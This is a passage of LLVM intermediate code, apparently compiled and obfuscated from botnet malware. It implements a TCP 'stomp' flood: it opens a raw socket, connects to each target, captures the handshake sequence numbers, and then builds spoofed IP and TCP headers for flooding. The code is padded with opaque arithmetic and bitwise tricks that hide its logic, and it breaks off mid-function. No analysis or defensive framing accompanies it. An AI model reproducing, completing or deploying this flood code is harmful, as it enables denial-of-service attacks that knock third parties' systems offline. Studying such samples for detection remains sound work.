  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %849

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %849

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %708, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %714

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %703, %690, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %708

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 %150, 2021728056
  %161 = add i32 %160, %159
  %162 = add i32 %161, 2021728056
  %163 = add i32 %150, %159
  %164 = call i32 @htonl(i32 %162) #7
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  br label %176

; <label>:167:                                    ; preds = %125
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %167, %143
  %177 = load i16, i16* %17, align 2
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 65535
  br i1 %179, label %180, label %192

; <label>:180:                                    ; preds = %176
  %181 = call i32 @rand_next()
  %182 = xor i32 %181, -1
  %183 = xor i32 65535, -1
  %184 = xor i32 1573182683, -1
  %185 = or i32 %182, %183
  %186 = or i32 1573182683, %184
  %187 = xor i32 %185, -1
  %188 = and i32 %187, %186
  %189 = and i32 %181, 65535
  %190 = trunc i32 %188 to i16
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  br label %196

; <label>:192:                                    ; preds = %176
  %193 = load i16, i16* %17, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %180
  %197 = load i32, i32* %26, align 4
  %198 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %199 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %199, %struct.sockaddr** %198, align 8
  %200 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %201 = load %struct.sockaddr*, %struct.sockaddr** %200, align 8
  %202 = call i32 @connect(i32 %197, %struct.sockaddr* %201, i32 16)
  %203 = call i64 @time(i64* null) #6
  store i64 %203, i64* %31, align 8
  br label %204

; <label>:204:                                    ; preds = %706, %196
  store i32 16, i32* %29, align 4
  %205 = load i32, i32* %10, align 4
  %206 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i64 @recvfrom(i32 %205, i8* %206, i64 256, i32 16384, %struct.sockaddr* %210, i32* %29)
  %212 = trunc i64 %211 to i32
  store i32 %212, i32* %33, align 4
  %213 = load i32, i32* %33, align 4
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %204
  br label %849

; <label>:216:                                    ; preds = %204
  %217 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %218 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %221 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 4
  %223 = icmp eq i32 %219, %222
  br i1 %223, label %224, label %696

; <label>:224:                                    ; preds = %216
  %225 = load i32, i32* %33, align 4
  %226 = sext i32 %225 to i64
  %227 = icmp ugt i64 %226, 40
  br i1 %227, label %228, label %696

; <label>:228:                                    ; preds = %224
  %229 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %230 = getelementptr inbounds i8, i8* %229, i64 20
  %231 = bitcast i8* %230 to %struct.tcphdr*
  store %struct.tcphdr* %231, %struct.tcphdr** %35, align 8
  %232 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = load i16, i16* %233, align 4
  %235 = zext i16 %234 to i32
  %236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %235, %238
  br i1 %239, label %240, label %695

; <label>:240:                                    ; preds = %228
  %241 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = lshr i16 %243, 9
  %245 = xor i16 1, -1
  %246 = xor i16 %244, %245
  %247 = and i16 %246, %244
  %248 = and i16 %244, 1
  %249 = zext i16 %247 to i32
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %660

; <label>:251:                                    ; preds = %240
  %252 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = lshr i16 %254, 12
  %256 = xor i16 1, -1
  %257 = xor i16 %255, %256
  %258 = and i16 %257, %255
  %259 = and i16 %255, 1
  %260 = zext i16 %258 to i32
  %261 = icmp ne i32 %260, 0
  br i1 %261, label %262, label %660

; <label>:262:                                    ; preds = %251
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %264 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 4
  %266 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %267 = load i32, i32* %9, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %266, i64 %268
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %269, i32 0, i32 0
  store i32 %265, i32* %270, align 4
  %271 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 2
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %278, i32 0, i32 1
  store i32 %274, i32* %279, align 4
  %280 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 3
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i32 0, i32 2
  store i32 %283, i32* %288, align 4
  %289 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 3
  store i16 %291, i16* %296, align 4
  %297 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %302, i32 0, i32 4
  store i16 %298, i16* %303, align 2
  %304 = load i32, i32* %24, align 4
  %305 = sext i32 %304 to i64
  %306 = add i64 40, 4118288679602275205
  %307 = add i64 %306, %305
  %308 = sub i64 %307, 4118288679602275205
  %309 = add i64 40, %305
  %310 = call noalias i8* @malloc(i64 %308) #6
  %311 = load i8**, i8*** %12, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds i8*, i8** %311, i64 %313
  store i8* %310, i8** %314, align 8
  %315 = load i8**, i8*** %12, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds i8*, i8** %315, i64 %317
  %319 = load i8*, i8** %318, align 8
  %320 = bitcast i8* %319 to %struct.iphdr*
  store %struct.iphdr* %320, %struct.iphdr** %36, align 8
  %321 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i64 1
  %323 = bitcast %struct.iphdr* %322 to %struct.tcphdr*
  store %struct.tcphdr* %323, %struct.tcphdr** %37, align 8
  %324 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i64 1
  %326 = bitcast %struct.tcphdr* %325 to i8*
  store i8* %326, i8** %38, align 8
  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = bitcast %struct.iphdr* %327 to i8*
  %329 = load i8, i8* %328, align 4
  %330 = xor i8 15, -1
  %331 = xor i8 %329, %330
  %332 = and i8 %331, %329
  %333 = and i8 %329, 15
  %334 = and i8 %332, 64
  %335 = xor i8 %332, 64
  %336 = or i8 %334, %335
  %337 = or i8 %332, 64
  store i8 %336, i8* %328, align 4
  %338 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %339 = bitcast %struct.iphdr* %338 to i8*
  %340 = load i8, i8* %339, align 4
  %341 = xor i8 %340, -1
  %342 = xor i8 -16, -1
  %343 = xor i8 67, -1
  %344 = or i8 %341, %342
  %345 = or i8 67, %343
  %346 = xor i8 %344, -1
  %347 = and i8 %346, %345
  %348 = and i8 %340, -16
  %349 = and i8 %347, 5
  %350 = xor i8 %347, 5
  %351 = or i8 %349, %350
  %352 = or i8 %347, 5
  store i8 %351, i8* %339, align 4
  %353 = load i8, i8* %13, align 1
  %354 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 1
  store i8 %353, i8* %355, align 1
  %356 = load i32, i32* %24, align 4
  %357 = sext i32 %356 to i64
  %358 = sub i64 40, 5604231980190124714
  %359 = add i64 %358, %357
  %360 = add i64 %359, 5604231980190124714
  %361 = add i64 40, %357
  %362 = trunc i64 %360 to i16
  %363 = call zeroext i16 @htons(i16 zeroext %362) #7
  %364 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 2
  store i16 %363, i16* %365, align 2
  %366 = load i16, i16* %14, align 2
  %367 = call zeroext i16 @htons(i16 zeroext %366) #7
  %368 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 3
  store i16 %367, i16* %369, align 4
  %370 = load i8, i8* %15, align 1
  %371 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 5
  store i8 %370, i8* %372, align 4
  %373 = load i8, i8* %16, align 1
  %374 = icmp ne i8 %373, 0
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %262
  %376 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %377 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 4
  store i16 %376, i16* %378, align 2
  br label %379

; <label>:379:                                    ; preds = %375, %262
  %380 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 6
  store i8 6, i8* %381, align 1
  %382 = load i32, i32* @LOCAL_ADDR, align 4
  %383 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 8
  store i32 %382, i32* %384, align 4
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 0
  %390 = load i32, i32* %389, align 4
  %391 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 9
  store i32 %390, i32* %392, align 4
  %393 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %396, i32 0, i32 3
  %398 = load i16, i16* %397, align 4
  %399 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %400 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %399, i32 0, i32 0
  store i16 %398, i16* %400, align 4
  %401 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %404, i32 0, i32 4
  %406 = load i16, i16* %405, align 2
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 1
  store i16 %406, i16* %408, align 2
  %409 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %410 = load i32, i32* %9, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %409, i64 %411
  %413 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %412, i32 0, i32 2
  %414 = load i32, i32* %413, align 4
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 2
  store i32 %414, i32* %416, align 4
  %417 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %420, i32 0, i32 1
  %422 = load i32, i32* %421, align 4
  %423 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 3
  store i32 %422, i32* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 4
  %427 = load i16, i16* %426, align 4
  %428 = xor i16 -241, -1
  %429 = xor i16 %427, %428
  %430 = and i16 %429, %427
  %431 = and i16 %427, -241
  %432 = xor i16 %430, -1
  %433 = xor i16 128, -1
  %434 = xor i16 -30306, -1
  %435 = and i16 %432, -30306
  %436 = and i16 %430, %434
  %437 = and i16 %433, -30306
  %438 = and i16 128, %434
  %439 = or i16 %435, %436
  %440 = or i16 %437, %438
  %441 = xor i16 %439, %440
  %442 = or i16 %432, %433
  %443 = xor i16 %442, -1
  %444 = or i16 -30306, %434
  %445 = and i16 %443, %444
  %446 = or i16 %441, %445
  %447 = or i16 %430, 128
  store i16 %446, i16* %426, align 4
  %448 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 4
  %450 = load i16, i16* %449, align 4
  %451 = xor i16 %450, -1
  %452 = xor i16 -257, -1
  %453 = xor i16 25315, -1
  %454 = or i16 %451, %452
  %455 = or i16 25315, %453
  %456 = xor i16 %454, -1
  %457 = and i16 %456, %455
  %458 = and i16 %450, -257
  %459 = and i16 %457, 256
  %460 = xor i16 %457, 256
  %461 = or i16 %459, %460
  %462 = or i16 %457, 256
  store i16 %461, i16* %449, align 4
  %463 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 4
  %465 = load i16, i16* %464, align 4
  %466 = xor i16 -4097, -1
  %467 = xor i16 %465, %466
  %468 = and i16 %467, %465
  %469 = and i16 %465, -4097
  %470 = and i16 %468, 4096
  %471 = xor i16 %468, 4096
  %472 = or i16 %470, %471
  %473 = or i16 %468, 4096
  store i16 %472, i16* %464, align 4
  %474 = call i32 @rand_next()
  %475 = xor i32 %474, -1
  %476 = xor i32 65535, -1
  %477 = xor i32 -1089005655, -1
  %478 = or i32 %475, %476
  %479 = or i32 -1089005655, %477
  %480 = xor i32 %478, -1
  %481 = and i32 %480, %479
  %482 = and i32 %474, 65535
  %483 = trunc i32 %481 to i16
  %484 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 5
  store i16 %483, i16* %485, align 2
  %486 = load i8, i8* %18, align 1
  %487 = sext i8 %486 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 4
  %490 = load i16, i16* %489, align 4
  %491 = xor i16 1, -1
  %492 = xor i16 %487, %491
  %493 = and i16 %492, %487
  %494 = and i16 %487, 1
  %495 = shl i16 %493, 13
  %496 = xor i16 %490, -1
  %497 = xor i16 -8193, -1
  %498 = xor i16 20814, -1
  %499 = or i16 %496, %497
  %500 = or i16 20814, %498
  %501 = xor i16 %499, -1
  %502 = and i16 %501, %500
  %503 = and i16 %490, -8193
  %504 = xor i16 %502, -1
  %505 = xor i16 %495, -1
  %506 = xor i16 -22774, -1
  %507 = and i16 %504, -22774
  %508 = and i16 %502, %506
  %509 = and i16 %505, -22774
  %510 = and i16 %495, %506
  %511 = or i16 %507, %508
  %512 = or i16 %509, %510
  %513 = xor i16 %511, %512
  %514 = or i16 %504, %505
  %515 = xor i16 %514, -1
  %516 = or i16 -22774, %506
  %517 = and i16 %515, %516
  %518 = or i16 %513, %517
  %519 = or i16 %502, %495
  store i16 %518, i16* %489, align 4
  %520 = load i8, i8* %19, align 1
  %521 = sext i8 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = xor i16 %521, -1
  %526 = xor i16 1, -1
  %527 = xor i16 32209, -1
  %528 = or i16 %525, %526
  %529 = or i16 32209, %527
  %530 = xor i16 %528, -1
  %531 = and i16 %530, %529
  %532 = and i16 %521, 1
  %533 = shl i16 %531, 12
  %534 = xor i16 -4097, -1
  %535 = xor i16 %524, %534
  %536 = and i16 %535, %524
  %537 = and i16 %524, -4097
  %538 = xor i16 %536, -1
  %539 = xor i16 %533, -1
  %540 = xor i16 -2509, -1
  %541 = and i16 %538, -2509
  %542 = and i16 %536, %540
  %543 = and i16 %539, -2509
  %544 = and i16 %533, %540
  %545 = or i16 %541, %542
  %546 = or i16 %543, %544
  %547 = xor i16 %545, %546
  %548 = or i16 %538, %539
  %549 = xor i16 %548, -1
  %550 = or i16 -2509, %540
  %551 = and i16 %549, %550
  %552 = or i16 %547, %551
  %553 = or i16 %536, %533
  store i16 %552, i16* %523, align 4
  %554 = load i8, i8* %20, align 1
  %555 = sext i8 %554 to i16
  %556 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 4
  %558 = load i16, i16* %557, align 4
  %559 = xor i16 1, -1
  %560 = xor i16 %555, %559
  %561 = and i16 %560, %555
